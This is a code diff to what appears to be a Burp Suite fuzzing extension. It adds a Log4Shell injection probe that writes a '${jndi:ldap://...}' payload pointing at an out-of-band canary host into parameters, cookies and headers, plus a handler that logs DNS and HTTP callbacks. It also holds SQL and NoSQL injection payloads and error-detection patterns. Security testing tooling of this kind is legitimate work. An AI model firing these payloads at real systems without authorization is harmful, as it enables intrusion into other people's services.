@@ -3,14 +3,15 @@ import json
 import urllib
 
 pool = RequestPool(5)
+canary = getOOBCanary()
+print(canary)
 
 ERROR_PATTERNS = {"unknown operator", "MongoError", "cannot be applied to a field", "expression is invalid", "SQL syntax", "java.sql.", "Syntax error", "Error SQL:", "SQL Execution", "\xe9\x99\x84\xe8\xbf\x91\xe6\x9c\x89\xe8\xaf\xad\xe6\xb3\x95\xe9\x94\x99\xe8\xaf\xaf", "SQLException", "\xe5\xbc\x95\xe5\x8f\xb7\xe4\xb8\x8d\xe5\xae\x8c\xe6\x95\xb4", " ORA-0", " ORA-1", "com.alibaba.fastjson","### SQL:"}
 INFO_PATTERNS = {"83b3j45b"}
-SKIP_HEADERS = {'content-length', 'host', 'transfer-encoding', 'cache-control', 'user-agent', 'pragma', 'priority', 'connection', 'cookie', 'content-type'}
+SKIP_HEADERS = {'content-length', 'host', 'transfer-encoding', 'cache-control', 'user-agent', 'pragma', 'priority', 'connection', 'cookie', 'content-type', 'upgrade-insecure-requests'}
 
 def finish():
     pool.shutdown()
-
 
 def fuzz_value(req, resp):
     fuzz_params(req, resp, payload="'\")", urlencode=True, concat=True, fuzz_cookie=True, fuzz_header=True)
@@ -27,11 +28,30 @@ def fuzz_all(req, resp):
     fuzz_key(req, resp)
     nosql(req, resp)
 
+def fuzz_log4j(req):
+    host = req.httpService().host()
+    fuzz_params(req, None, payload="${jndi:ldap://" + host + '.' + canary + "}", urlencode=True, concat=False, fuzz_cookie=True, fuzz_header=True)
+
+def handleInteraction(interaction):
+    t = interaction.type()
+    oob_id = interaction.id().toString()
+    clientIp = interaction.clientIp()
+    clientPort = interaction.clientPort()
+    print(clientIp, clientPort, t, oob_id)
+
+    dnsDetails = interaction.dnsDetails()
+    httpDetails = interaction.httpDetails()
+    if dnsDetails.isPresent():
+        print(dnsDetails.get().query().toString())
+    if httpDetails.isPresent():
+        print(httpDetails.get().requestResponse().request())
+
 def registerContextMenu(menus):
     menus.register("fuzz nosql", nosql, MenuType.REQUEST_RESPONSE)
     menus.register("fuzz param key", fuzz_key, MenuType.REQUEST_RESPONSE)
     menus.register("fuzz param value", fuzz_value, MenuType.REQUEST_RESPONSE)
     menus.register("fuzz all", fuzz_all, MenuType.REQUEST_RESPONSE)
+    menus.register("fuzz log4j", fuzz_log4j, MenuType.REQUEST)
 
 
 @run_in_pool(pool)
@@ -100,7 +120,7 @@ def iter_and_modify_json(node, payload, concat=True, fuzz_key_only=False):
 
 def fuzz_headers(request, origin_response, payload="'", concat=True):
     for header in request.headers():
-        if header.name().lower().startswith("sec-") or header.name().lower().startswith("accept"):
+        if header.name().lower().startswith("sec-") or header.name().lower().startswith("accept") or header.name().lower().startswith("if-"):
             continue
         if header.name().lower() in SKIP_HEADERS:
             continue
